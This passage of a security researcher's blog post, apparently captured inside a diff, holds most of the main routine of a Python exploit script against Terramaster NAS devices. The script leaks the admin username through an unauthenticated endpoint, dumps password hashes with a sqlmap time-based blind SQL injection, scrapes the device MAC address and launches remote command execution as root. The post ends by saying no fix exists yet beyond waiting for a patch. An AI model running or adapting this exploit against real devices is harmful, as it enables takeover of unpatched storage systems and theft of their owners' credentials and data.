+    parser.add_argument(<span style="color:#ed9d13">&#34;--sqlmap-time&#34;</span>, action=<span style="color:#ed9d13">&#34;store&#34;</span>, <span style="color:#24909d">type</span>=<span style="color:#24909d">int</span>, default=<span style="color:#3677a9">1</span>, help=<span style="color:#ed9d13">&#34;Passed as --time-sec to sqlmap&#34;</span>)
+    args=parser.parse_args()
+
+    <span style="color:#6ab825;font-weight:bold">if</span> args.list:
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[-] RCEs:&#34;</span>)
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">0: Needs user credentials only (* +user hash). Runs as user.&#34;</span>)
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">1: Needs admin credentials only (* +admin hash). Runs as root.&#34;</span>)
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">2: Needs user credentials AND admin hash. Runs as root.&#34;</span>)
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">3: Needs user credentials AND user hash. Runs as root. WILL BREAK THINGS.&#34;</span>)
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">* Even if 0 and 1 do not really require a hash, provide a valid one it as otherwise the login fails, lazy me.&#34;</span>)
+        exit(<span style="color:#3677a9">0</span>)
+    <span style="color:#6ab825;font-weight:bold">if</span> args.sqlmap_path <span style="color:#6ab825;font-weight:bold">is</span> <span style="color:#6ab825;font-weight:bold">None</span> <span style="color:#6ab825;font-weight:bold">and</span> (args.users_table <span style="color:#6ab825;font-weight:bold">is</span> <span style="color:#6ab825;font-weight:bold">None</span> <span style="color:#6ab825;font-weight:bold">or</span> args.credentials <span style="color:#6ab825;font-weight:bold">is</span> <span style="color:#6ab825;font-weight:bold">None</span>):
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[!] Could not find sqlmap on the system, to install it: &#39;pip install sqlmap&#39;&#34;</span>)
+        exit(<span style="color:#3677a9">1</span>)
+    
+    s = get_session(args.proxy)
+    TARGET = args.target
+
+    <span style="color:#6ab825;font-weight:bold">if</span> args.username <span style="color:#6ab825;font-weight:bold">is</span> <span style="color:#6ab825;font-weight:bold">None</span>:
+        <span style="color:#999;font-style:italic">#ADMIN USER INFO DISCLOSURE</span>
+        USER = s.get(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/v1/SessionEvents/update&#34;</span>).json()[<span style="color:#ed9d13">&#34;data&#34;</span>][<span style="color:#ed9d13">&#34;USER&#34;</span>] 
+        B64USER = <span style="color:#24909d">str</span>(base64.b64encode(USER.encode(<span style="color:#ed9d13">&#34;utf8&#34;</span>)), encoding=<span style="color:#ed9d13">&#34;utf8&#34;</span>)
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;[*] Found ADMIN user: </span><span style="color:#ed9d13">{</span>USER<span style="color:#ed9d13">}</span><span style="color:#ed9d13"> (</span><span style="color:#ed9d13">{</span>B64USER<span style="color:#ed9d13">}</span><span style="color:#ed9d13">)&#34;</span>)
+    <span style="color:#6ab825;font-weight:bold">else</span>:
+       USER = args.username
+       B64USER = <span style="color:#24909d">str</span>(base64.b64encode(USER.encode(<span style="color:#ed9d13">&#34;utf8&#34;</span>)), encoding=<span style="color:#ed9d13">&#34;utf8&#34;</span>) 
+       <span style="color:#24909d">print</span>(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;[*] Using provided USER: </span><span style="color:#ed9d13">{</span>USER<span style="color:#ed9d13">}</span><span style="color:#ed9d13"> (</span><span style="color:#ed9d13">{</span>B64USER<span style="color:#ed9d13">}</span><span style="color:#ed9d13">)&#34;</span>)
+
+    <span style="color:#6ab825;font-weight:bold">if</span> args.get_hash:
+        <span style="color:#999;font-style:italic">#Too lazy to manually implement this, so I&#39;ll just use sqlmap</span>
+        <span style="color:#999;font-style:italic">#SQL Injection (Double Blind)</span>
+        cmd=<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>args.sqlmap_path<span style="color:#ed9d13">}</span><span style="color:#ed9d13"> -u </span><span style="color:#ed9d13">\&#34;</span><span style="color:#ed9d13">{</span>args.target<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/tos/index.php?user/loginSubmit&amp;name=sqli&amp;password=n0t&amp;platform=me</span><span style="color:#ed9d13">\&#34;</span><span style="color:#ed9d13"> --batch --dbms=sqlite --level=5 --risk=2 --technique=t -p name -T user_table -C password  --dump --time-sec </span><span style="color:#ed9d13">{</span>args.sqlmap_time<span style="color:#ed9d13">}</span><span style="color:#ed9d13"> --where </span><span style="color:#ed9d13">\&#34;</span><span style="color:#ed9d13">username=&#39;</span><span style="color:#ed9d13">{</span>B64USER<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\&#34;</span><span style="color:#ed9d13">&#34;</span>
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;[.] Launching sqlmap (may take a while): </span><span style="color:#ed9d13">{</span>cmd<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>)
+        os.system(cmd)        
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[.] If dump was successfull re-run exploit with -H or --hash&#34;</span>)
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[.] Check for hash in STDOUT or ~/.local/share/sqlmap/output/&lt;TARGET&gt;/dump/SQLite_masterdb/user_table.csv&#34;</span>)
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[.] Here, hava a cat judging you:&#34;</span>)
+        <span style="color:#24909d">print</span>(meow)
+        exit(<span style="color:#3677a9">0</span>)
+
+    <span style="color:#999;font-style:italic">#MAC INFO DISCLOSURE</span>
+    <span style="color:#6ab825;font-weight:bold">try</span>:
+        MAC_ADDRESS = RE.findall(s.get(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/m1.php&#34;</span>).text)[<span style="color:#3677a9">0</span>].replace(<span style="color:#ed9d13">&#34;:&#34;</span>,<span style="color:#ed9d13">&#34;&#34;</span>)
+    <span style="color:#6ab825;font-weight:bold">except</span> <span style="color:#bbb">IndexError</span>:
+        <span style="color:#6ab825;font-weight:bold">try</span>:
+            MAC_ADDRESS = RE.findall(s.get(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/m2.php&#34;</span>).text)[<span style="color:#3677a9">0</span>].replace(<span style="color:#ed9d13">&#34;:&#34;</span>,<span style="color:#ed9d13">&#34;&#34;</span>)
+        <span style="color:#6ab825;font-weight:bold">except</span> <span style="color:#bbb">IndexError</span>:
+            <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[!] MAC not found.&#34;</span>)
+            exit(<span style="color:#3677a9">1</span>)
+    <span style="color:#24909d">print</span>(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;[*] Found MAC: </span><span style="color:#ed9d13">{</span>MAC_ADDRESS<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>)
+    
+
+    PASS = args.password
+    HASH = args.hash
+    <span style="color:#6ab825;font-weight:bold">if</span> PASS == <span style="color:#ed9d13">&#34;&#34;</span>:
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[!] User password is required to launch exploit, use --password.&#34;</span>)
+        exit(<span style="color:#3677a9">1</span>)
+    <span style="color:#6ab825;font-weight:bold">if</span> HASH == <span style="color:#ed9d13">&#34;&#34;</span>:
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[!] User hash is required to launch exploit, use -g or --get-hash to get a valid hash.&#34;</span>)
+        exit(<span style="color:#3677a9">1</span>)  
+    
+    <span style="color:#24909d">print</span>(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;[*] Using password: </span><span style="color:#ed9d13">{</span>PASS<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>)
+    <span style="color:#24909d">print</span>(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;[*] Using hash: </span><span style="color:#ed9d13">{</span>args.hash<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>)
+    exploit(s, USER, args.hash, args.rce, args.cmd)
+</code></pre></div><h2 id="goodbye-my-friend">Goodbye, my friend</h2>
+<p>I guess I will now take a break from breaking Terramaster (put intended), it stopped being fun - at least for now. It&rsquo;s basically a metasploitable, but you pay for it.</p>
+<p>As for the remediations, this time you really can&rsquo;t do much other than wait for a patch and use strong passwords.
+Protip for terramaster: if researchers try to get in touch with you via twitter and via your support mail and your support chat, do not ignore them :).</p>
+<p>As a side note, if any &ldquo;researcher&rdquo; uses my work it&rsquo;d be cool if y&rsquo;all at least mentioned me. Just saying.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="/tags/5/">5</a></span>
+        <span class="tag"><a href="/tags/0day/">0day</a></span>
+        <span class="tag"><a href="/tags/terramaster/">terramaster</a></span>
+        <span class="tag"><a href="/tags/rce/">rce</a></span>
+        <span class="tag"><a href="/tags/sqli/">sqli</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1873 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-03-13 05:57
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=All%20you%20can%20PWN%20buffet&amp;caption=All%20you%20can%20PWN%20buffet&amp;canonicalUrl=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=All%20you%20can%20PWN%20buffet&amp;body=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f&amp;media=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f;description=All%20you%20can%20PWN%20buffet" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f&amp;title=All%20you%20can%20PWN%20buffet&amp;summary=All%20you%20can%20PWN%20buffet&amp;source=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f&amp;resubmit=true&amp;title=All%20you%20can%20PWN%20buffet" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f;title=All%20you%20can%20PWN%20buffet" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=All%20you%20can%20PWN%20buffet%20%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f&amp;t=All%20you%20can%20PWN%20buffet" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=All%20you%20can%20PWN%20buffet&amp;url=%2fposts%2f2022%2f03%2fall-you-can-pwn-buffet%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="/posts/2021/12/how-to-summon-rces/">
+                    <span class="button__text">How to summon RCEs</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+
+
+
+    </body>
+</html>
